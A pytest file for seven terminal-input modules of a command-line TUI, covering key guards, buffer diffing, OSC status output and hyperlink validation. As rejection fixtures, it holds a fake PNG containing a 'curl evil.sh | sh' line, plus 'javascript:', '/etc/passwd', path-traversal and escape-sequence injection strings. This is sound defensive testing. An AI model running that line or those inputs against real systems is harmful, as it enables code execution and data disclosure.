"""第 11 轮：input_keymap 组 7 个模块的对齐回归。

每个测试类对应一个上游模块，断言逐条指向可核验的上游契约。
"""
from __future__ import annotations

import io
from pathlib import Path

import pytest

from tuan_cli.tui import inputkit
from tuan_cli.tui.inputkit import vim_search as vs
from tuan_cli.tui.inputkit import activation_key_guard as akg
from tuan_cli.tui.inputkit import copy_input_guard as cig
from tuan_cli.tui.inputkit import custom_terminal as ct
from tuan_cli.tui.inputkit import terminal_program_status as tps
from tuan_cli.tui.inputkit import terminal_hyperlinks as th
from tuan_cli.tui.inputkit import terminal_visualization_instructions as tvi


# ---------------------------------------------------------------- vim_search
class TestVimSearch:
    def test_direction_default_and_reversed(self):
        assert vs.SearchDirection.default() is vs.SearchDirection.FORWARD
        assert vs.SearchDirection.FORWARD.reversed() is vs.SearchDirection.BACKWARD
        assert vs.SearchDirection.BACKWARD.reversed() is vs.SearchDirection.FORWARD

    def test_empty_query_no_matches(self):
        assert vs.matching_ranges("hello", "") == []
        assert vs.matching_ranges("", "x") == []

    def test_literal_not_regex(self):
        # "." 必须按字面匹配，不能当正则的通配符
        assert vs.matching_ranges("a.b", "a.b") == [range(0, 3)]
        assert vs.matching_ranges("axb", "a.b") == []

    def test_multiple_matches(self):
        r = vs.matching_ranges("ab ab ab", "ab")
        assert r == [range(0, 2), range(3, 5), range(6, 8)]

    def test_match_spans_complete_grapheme(self):
        # e + combining acute：匹配 "e" 时范围必须覆盖整个簇
        text = "cafe\u0301 x"
        r = vs.matching_ranges(text, "e")
        assert r and r[0].stop > r[0].start + 1

    def test_cjk_match(self):
        assert vs.matching_ranges("中文中文", "中文") == [
            range(0, 2), range(2, 4)]

    def test_backward_helper_filters_before(self):
        r = vs.matching_ranges_backward("ab ab ab", "ab", before=5)
        assert r == [range(0, 2), range(3, 5)]

    def test_grapheme_cluster_crlf(self):
        clusters = list(vs.iter_graphemes("a\r\nb"))
        assert [c for _, c in clusters] == ["a", "\r\n", "b"]

    def test_query_defaults(self):
        q = vs.SearchQuery()
        assert q.text == "" and q.direction is vs.SearchDirection.FORWARD


# ---------------------------------------------------------------- activation
class TestActivationKeyGuard:
    def test_constants(self):
        assert akg.INITIAL_GUARD_SECONDS == 1.0
        assert akg.LEGACY_REPEAT_GUARD_SECONDS == 1.0

    def _guard(self, reported_only=False):
        return akg.ActivationKeyGuard.new_at(
            akg.KeyBinding("ctrl-t"), 100.0, reported_only,
            clock=lambda: 100.0)

    def test_same_key_press_within_window_is_suppressed(self):
        g = self._guard()
        assert g.consume_at(akg.KeyBinding("ctrl-t"),
                            akg.KeyEventKind.PRESS, 100.5) is True
        assert "within_initial_guard" in g.suppression_reason()

    def test_reported_repeat_extends_window(self):
        g = self._guard()
        assert g.consume_at(akg.KeyBinding("ctrl-t"),
                            akg.KeyEventKind.REPEAT, 100.2) is True
        assert g.block_until() >= 101.2

    def test_window_expiry_deactivates(self):
        g = self._guard()
        assert g.consume_at(akg.KeyBinding("ctrl-t"),
                            akg.KeyEventKind.PRESS, 102.0) is False
        assert g.is_active() is False
        assert "guard_window_expired" in g.suppression_reason()

    def test_release_clears_and_is_consumed(self):
        g = self._guard()
        assert g.consume_at(akg.KeyBinding("ctrl-t"),
                            akg.KeyEventKind.RELEASE, 100.1) is True
        assert g.is_active() is False
        assert "release_clears_guard" in g.suppression_reason()

    def test_reported_repeats_only_fresh_press_not_suppressed(self):
        g = self._guard(reported_only=True)
        assert g.consume_at(akg.KeyBinding("ctrl-t"),
                            akg.KeyEventKind.PRESS, 100.1) is False
        assert g.is_active() is False
        assert "fresh_press" in g.suppression_reason()

    def test_reported_repeats_only_still_catches_repeat(self):
        g = self._guard(reported_only=True)
        assert g.consume_at(akg.KeyBinding("ctrl-t"),
                            akg.KeyEventKind.REPEAT, 100.1) is True

    def test_different_key_ends_guard(self):
        g = self._guard()
        assert g.consume_at(akg.KeyBinding("esc"),
                            akg.KeyEventKind.PRESS, 100.1) is False
        assert g.is_active() is False

    def test_inactive_guard_never_suppresses(self):
        g = self._guard()
        g.consume_at(akg.KeyBinding("esc"), akg.KeyEventKind.PRESS, 100.1)
        assert g.consume_at(akg.KeyBinding("ctrl-t"),
                            akg.KeyEventKind.REPEAT, 100.2) is False

    def test_physical_key_ignores_shift_and_case(self):
        assert akg.KeyBinding("Ctrl-T").is_same_physical_key(
            akg.KeyBinding("shift-ctrl-t"))
        assert not akg.KeyBinding("ctrl-t").is_same_physical_key(
            akg.KeyBinding("ctrl-s"))


# ---------------------------------------------------------------- copy guard
class TestCopyInputGuard:
    def test_normal_scope_releases(self):
        q = cig.QueuedSubmissions()
        assert q.paused is True
        g = cig.guard_with(q)
        with g:
            assert q.paused is True
        assert q.paused is False and q.resume_count == 1

    def test_exception_path_still_releases(self):
        """对齐 Rust Drop：异常路径也必须释放，不能让排队提交永久暂停。"""
        q = cig.QueuedSubmissions()
        with pytest.raises(RuntimeError):
            with cig.guard_with(q):
                raise RuntimeError("boom")
        assert q.paused is False
        assert q.resume_count == 1

    def test_exception_is_not_swallowed(self):
        """本地化边界：不通过 __exit__ 返回 True 吞掉用户异常。"""
        with pytest.raises(ValueError):
            with cig.CopyInputGuard(lambda e: None):
                raise ValueError("keep me")
        # 未捕获断言由 pytest.raises 保证

    def test_idempotent_release(self):
        seen = []
        g = cig.CopyInputGuard(seen.append)
        assert g.release() is True
        assert g.release() is False
        assert seen == [cig.TRANSCRIPT_COPY_CLOSED]

    def test_sender_failure_still_marks_released(self):
        def bad(_):
            raise OSError("terminal gone")
        g = cig.CopyInputGuard(bad)
        assert g.release() is True
        assert g.released is True
        assert g.last_error and "OSError" in g.last_error

    def test_requires_callable(self):
        with pytest.raises(TypeError):
            cig.CopyInputGuard("not callable")


# ---------------------------------------------------------------- terminal diff
class TestCustomTerminal:
    def _buf(self, w=10, h=2):
        return ct.Buffer(ct.Rect(0, 0, w, h))

    def test_osc8_parts(self):
        seq = "\x1b]8;;https://example.com\x07visible\x1b]8;;\x07"
        assert ct.osc8_hyperlink_parts(seq) == ("https://example.com", "visible")
        assert ct.osc8_hyperlink_parts("\x1b]8;;\x07x\x1b]8;;\x07") is None
        assert ct.osc8_hyperlink_parts("plain") is None

    def test_identical_buffers_no_updates(self):
        a, b = self._buf(), self._buf()
        assert ct.diff_buffers(a, b) == []

    def test_put_on_change(self):
        a, b = self._buf(), self._buf()
        b.set(2, 0, ct.Cell(symbol="X"))
        cmds = ct.diff_buffers(a, b)
        assert any(isinstance(c, ct.Put) and c.cell.symbol == "X" for c in cmds)

    def test_clear_to_end_optimization(self):
        """行尾用一个 ClearToEnd，而不是逐格空格 Put。"""
        a, b = self._buf(w=20), self._buf(w=20)
        for x in range(15):
            a.set(x, 0, ct.Cell(symbol="#"))
            b.set(x, 0, ct.Cell(symbol="#"))
        # 让**前一帧**尾部有内容、当前帧尾部为空，才构成 tail_changed
        a.set(16, 0, ct.Cell(symbol="Z"))
        cmds = ct.diff_buffers(a, b)
        assert any(isinstance(c, ct.ClearToEnd) for c in cmds)
        # Put 数量应远小于尾部格子数（性能优化可度量）
        puts = [c for c in cmds if isinstance(c, ct.Put)]
        assert len(puts) < 5

    def test_always_update_blank_not_filtered_from_prefix(self):
        a, b = self._buf(w=12), self._buf(w=12)
        for x in range(10):
            b.set(x, 0, ct.Cell(symbol=" ",
                                diff_option=ct.CellDiffOption.ALWAYS_UPDATE))
        cmds = ct.diff_buffers(a, b)
        puts = [c for c in cmds if isinstance(c, ct.Put)]
        assert len(puts) >= 10, "AlwaysUpdate 空白不能被尾部过滤丢掉"

    def test_skip_semantics(self):
        a, b = self._buf(), self._buf()
        b.set(3, 0, ct.Cell(symbol="Z", diff_option=ct.CellDiffOption.SKIP))
        cmds = ct.diff_buffers(a, b)
        assert not any(isinstance(c, ct.Put) and c.cell.symbol == "Z"
                       for c in cmds)

    def test_wide_char_overlaps_tail_forces_clear(self):
        """前一帧宽字符跨过 clear 边界时，即使尾部相等也要 ClearToEnd。"""
        a, b = self._buf(w=10), self._buf(w=10)
        # 前一帧有宽字符，当前帧把它删掉：tail 相等但宽字符跨界，
        # 上游仍强制 ClearToEnd（否则会留下半个字的残影）。
        a.set(0, 0, ct.Cell(symbol="中"))  # 宽 2
        cmds = ct.diff_buffers(a, b)
        assert any(isinstance(c, ct.ClearToEnd) for c in cmds)
        # 对照：没有宽字符时，相同尾部不触发 ClearToEnd
        a2, b2 = self._buf(w=10), self._buf(w=10)
        assert not any(isinstance(c, ct.ClearToEnd)
                       for c in ct.diff_buffers(a2, b2))

    def test_display_width_cjk_and_combining(self):
        assert ct.display_width("中") == 2
        assert ct.display_width("a") == 1
        assert ct.display_width("\u0301") == 0

    def test_zero_width_cell_treated_as_one(self):
        assert ct.Cell(symbol="\u0301").cell_width() == 1

    def test_terminal_draw_emits_synchronized_frame(self):
        backend = ct.TerminalBackend((20, 2))
        t = ct.Terminal(backend)
        def render(frame):
            frame.buffer_mut().set(1, 0, ct.Cell(symbol="A"))
        stats = t.draw(render)
        assert stats["puts"] >= 1
        assert backend.writes[0] == "\x1b[?2026h"
        assert backend.writes[-1] == "\x1b[?2026l"
        assert backend.synchronized_depth == 0

    def test_flush_updates_tracks_last_put(self):
        backend = ct.TerminalBackend((20, 2))
        t = ct.Terminal(backend)
        t.flush_updates([ct.Put(3, 1, ct.Cell(symbol="Q"))])
        assert t.last_known_cursor_pos == (3, 1)

    def test_drop_restores_cursor(self):
        backend = ct.TerminalBackend((20, 2))
        t = ct.Terminal(backend)
        backend.set_cursor_style("blink")
        t.hidden_cursor = True
        backend.hide_cursor()
        t.close()
        assert backend.cursor_style is None
        assert backend.hidden_cursor is False

    def test_invalidate_viewport_forces_redraw(self):
        a, b = self._buf(w=6), self._buf(w=6)
        t = ct.Terminal(ct.TerminalBackend((6, 2)))
        t.invalidate_viewport()
        cmds = ct.diff_buffers(t.previous_buffer(), t.current_buffer())
        assert cmds  # 所有旧格标记 AlwaysUpdate 后必须产生更新

    def test_resize_and_viewport(self):
        t = ct.Terminal(ct.TerminalBackend((20, 2)))
        t.resize((40, 5))
        assert t.last_known_screen_size == (40, 5)
        t.set_viewport_area(ct.Rect(0, 0, 30, 3))
        assert t.viewport_area.width == 30


# ---------------------------------------------------------------- status
class TestTerminalProgramStatus:
    def setup_method(self):
        tps._reset_for_tests()

    def teardown_method(self):
        tps._reset_for_tests()

    def test_constants(self):
        assert tps.MIN_VTE_VERSION_WITH_SAFE_OSC == 5400

    def test_labels_indicators_states(self):
        assert tps.ProgramStatus.idle().iterm_label() == "Idle"
        assert tps.ProgramStatus.working().iterm_label() == "Working"
        assert tps.ProgramStatus.blocked(
            tps.ProgramStatusKind.PERMISSION).iterm_label() == "Waiting"
        assert tps.ProgramStatus.working().iterm_indicator() == "#ff9500"
        assert tps.ProgramStatus.blocked(
            tps.ProgramStatusKind.QUESTION).iterm_indicator() == "#5f87ff"
        assert tps.ProgramStatus.done().protocol_state() == "done"
        assert tps.ProgramStatus.error().protocol_state() == "error"

    def test_support_gate(self):
        assert tps.support_for(False, None, False).osc_7501 is False
        assert tps.support_for(True, 5300, False).osc_7501 is False
        assert tps.support_for(True, 5400, False).osc_7501 is True
        assert tps.support_for(True, None, False).osc_7501 is True
        assert tps.support_for(True, None, True).osc_21337 is False

    def test_safe_default_no_emission(self):
        """未 configure 时绝不往终端写 OSC（本地化安全默认）。"""
        assert tps.set_terminal_program_status(tps.ProgramStatus.working()) is False
        assert tps.session_status_snapshot()[2] == 0

    def test_dedup_cache(self):
        buf = []
        tps.configure(writer=buf.append,
                      support=tps.TerminalProgramStatusSupport(True, True))
        assert tps.set_terminal_program_status(
            tps.ProgramStatus.working(), "hi") is True
        assert tps.set_terminal_program_status(
            tps.ProgramStatus.working(), "hi") is False
        assert len(buf) == 1

    def test_invalidate_forces_reemit(self):
        buf = []
        tps.configure(writer=buf.append,
                      support=tps.TerminalProgramStatusSupport(True, False))
        tps.set_terminal_program_status(tps.ProgramStatus.working())
        tps.invalidate_terminal_program_status()
        assert tps.set_terminal_program_status(
            tps.ProgramStatus.working()) is True
        assert len(buf) == 2

    def test_detail_escaping_and_sanitizing(self):
        detail = "a;b\\c\x07\x1b]999;evil"
        clean = tps.sanitize_iterm_session_detail(detail)
        assert "\\;" in clean and "\\\\" in clean
        assert "\x07" not in clean and "\x1b" not in clean

    def test_osc_sequence_never_contains_raw_bel_in_detail(self):
        buf = []
        tps.configure(writer=buf.append,
                      support=tps.TerminalProgramStatusSupport(True, True))
        tps.set_terminal_program_status(
            tps.ProgramStatus.blocked(tps.ProgramStatusKind.AUTH),
            "needs;login\\now\x07")
        seq = buf[0]
        assert seq.count("\x07") == 2  # 只有两个协议终止符，detail 里无裸 BEL
        assert "reason=auth" in seq

    def test_clear(self):
        buf = []
        tps.configure(writer=buf.append,
                      support=tps.TerminalProgramStatusSupport(True, True))
        tps.set_terminal_program_status(tps.ProgramStatus.working())
        assert tps.clear_terminal_program_status() is True
        assert tps.session_status_snapshot()[0] == "cleared"


# ---------------------------------------------------------------- hyperlinks
class TestTerminalHyperlinks:
    def test_constants(self):
        assert th.MAX_HYPERLINK_DESTINATION_BYTES == 8192
        assert len(th.SAFE_WORKSPACE_EXTENSIONS) == 17
        assert "css" in th.SAFE_WORKSPACE_EXTENSIONS

    def test_web_accepts_https(self):
        h = th.TerminalHyperlink.web(range(0, 4), "https://example.com/a")
        assert h and h.destination_kind is th.DestinationKind.WEB

    @pytest.mark.parametrize("bad", [
        "javascript:alert(1)", "data:text/html,x", "file:///etc/passwd",
        "//example.com", "https://", "https://exa\x07mple.com",
        "https://exa\x1b]8;;evil", "https://example.com/" + "a" * 9000,
    ])
    def test_web_rejects_unsafe_or_oversized(self, bad):
        """本地化安全增强：非 http(s) / 控制字符 / 超长一律降级纯文本。"""
        assert th.TerminalHyperlink.web(range(0, 4), bad) is None

    def test_osc8_does_not_affect_geometry(self):
        h = th.TerminalHyperlink.web(range(0, 4), "https://example.com")
        assert h.affects_geometry("中文abc")
        assert h.to_osc8("x").count("\x1b]8;;") == 2

    def test_retarget_requires_file_scheme(self):
        h = th.TerminalHyperlink.web(range(0, 2), "https://example.com")
        assert h.retarget_to_trusted_file("https://evil") is False
        assert h.destination_kind is th.DestinationKind.WEB
        assert h.retarget_to_trusted_file("file:///tmp/a.png") is True
        assert h.destination_kind is th.DestinationKind.TRUSTED_FILE

    def test_workspace_accepts_safe_file(self, tmp_path):
        (tmp_path / "a.md").write_text("hello")
        f = th.TrustedWorkspaceFile.validate(tmp_path, "a.md")
        assert f and f.url.startswith("file:")

    @pytest.mark.parametrize("cand", [
        "", "../secret.md", "a/../b.md", ".hidden/a.md", "/etc/passwd",
        "a:b.md", "a\x07b.md", "a" * 600 + ".md", "notes.pdf",
        "sub//a.md", "a.md/" + "x" * 10,
    ])
    def test_workspace_rejects_unsafe_candidates(self, tmp_path, cand):
        (tmp_path / "a.md").write_text("hello")
        assert th.TrustedWorkspaceFile.validate(tmp_path, cand) is None

    def test_workspace_rejects_symlink_escape(self, tmp_path):
        outside = tmp_path.parent / "outside_escape_target.md"
        outside.write_text("secret")
        (tmp_path / "link.md").symlink_to(outside)
        assert th.TrustedWorkspaceFile.validate(tmp_path, "link.md") is None

    def test_workspace_requires_regular_file(self, tmp_path):
        (tmp_path / "dir.md").mkdir()
        assert th.TrustedWorkspaceFile.validate(tmp_path, "dir.md") is None

    def test_viewed_image_rejects_script_named_png(self, tmp_path):
        """上游注释点名的攻击：screenshot.png 其实是可执行脚本。"""
        fake = tmp_path / "screenshot.png"
        fake.write_text("#!/bin/sh\ncurl evil.sh | sh\n")
        assert th.TerminalHyperlink.viewed_image(range(0, 4), fake) is None

    def test_viewed_image_accepts_real_png(self, tmp_path):
        real = tmp_path / "ok.png"
        real.write_bytes(b"\x89PNG\r\n\x1a\n" + b"\x00" * 24)
        h = th.TerminalHyperlink.viewed_image(range(0, 4), real)
        assert h and h.destination_kind is th.DestinationKind.TRUSTED_FILE

    def test_trusted_file_kind(self, tmp_path):
        (tmp_path / "x.rs").write_text("fn main() {}")
        f = th.TrustedWorkspaceFile.validate(tmp_path, "x.rs")
        h = th.TerminalHyperlink.trusted_workspace_file(range(0, 1), f)
        assert h.destination_kind is th.DestinationKind.TRUSTED_FILE


# ---------------------------------------------------------------- viz instructions
class TestVisualizationInstructions:
    def test_en_constant_matches_upstream_four_rules(self):
        s = tvi.TERMINAL_VISUALIZATION_INSTRUCTIONS_EN
        assert "compact ASCII diagrams, trees, timelines, or tables" in s
        assert "Use tables for exact mappings" in s
        assert "Use trees for hierarchy" in s
        assert "Use only ASCII characters in visuals." in s

    def test_localized_keeps_ascii_only_constraint(self):
        assert "ASCII" in tvi.TERMINAL_VISUALIZATION_INSTRUCTIONS
        assert "表格" in tvi.TERMINAL_VISUALIZATION_INSTRUCTIONS

    def test_gate_off_returns_control_instructions_unchanged(self):
        cfg = type("C", (), {"features": set()})()
        assert tvi.with_terminal_visualization_instructions(cfg, None) is None
        assert tvi.with_terminal_visualization_instructions(cfg, "raw") == "raw"

    def test_gate_on_with_no_existing(self):
        cfg = type("C", (), {"features": {"TerminalVisualizationInstructions"}})()
        out = tvi.with_terminal_visualization_instructions(cfg)
        assert out == tvi.TERMINAL_VISUALIZATION_INSTRUCTIONS

    def test_gate_on_appends_to_existing(self):
        cfg = type("C", (), {"features": set(),
                             "developer_instructions": "dev"})()
        cfg.features = {"TerminalVisualizationInstructions"}
        out = tvi.with_terminal_visualization_instructions(cfg)
        assert out.startswith("dev\n\n")
        assert "ASCII" in out

    def test_control_instructions_take_precedence(self):
        cfg = type("C", (), {"features": {"TerminalVisualizationInstructions"},
                             "developer_instructions": "dev"})()
        out = tvi.with_terminal_visualization_instructions(cfg, "ctrl")
        assert out.startswith("ctrl\n\n") and "dev" not in out

    def test_english_lang(self):
        assert "This surface is a terminal" in tvi.active_text("en")
        assert "当前界面是终端" in tvi.active_text("zh-CN")

    def test_length_cap(self):
        cfg = type("C", (), {"features": {"TerminalVisualizationInstructions"}})()
        out = tvi.with_terminal_visualization_instructions(cfg, "x" * 100000)
        assert len(out) < 70000


# ---------------------------------------------------------------- package
class TestInputkitPackage:
    def test_report(self):
        r = inputkit.inputkit_report()
        assert r["modules"] == 7
        assert r["upstream_group"] == "input_keymap"
        assert r["constants"]["MIN_VTE_VERSION_WITH_SAFE_OSC"] == 5400

    def test_validate_clean(self):
        assert inputkit.inputkit_validate() == []

    def test_parity_includes_inputkit(self):
        from tuan_cli.tui.parity import parity_report, parity_validate
        r = parity_report()
        assert r["inputkit"]["modules"] == 7
        # A 线续轮 XI 同步（pending 24 -> 15 -> 10 -> 0）
        assert r["matrix"]["pending"] == 0
        assert r["matrix"]["by_status"]["aligned"] == 45
        assert r["matrix"]["coverage_pct"] == 100.0
        assert r["matrix"]["depth_verified"] == 10
        assert r["corekit"]["modules"] == 9
        assert r["configkit"]["modules"] == 5
        assert r["corekit"]["security_wiring"]["intact"] is True
        assert parity_validate() == []
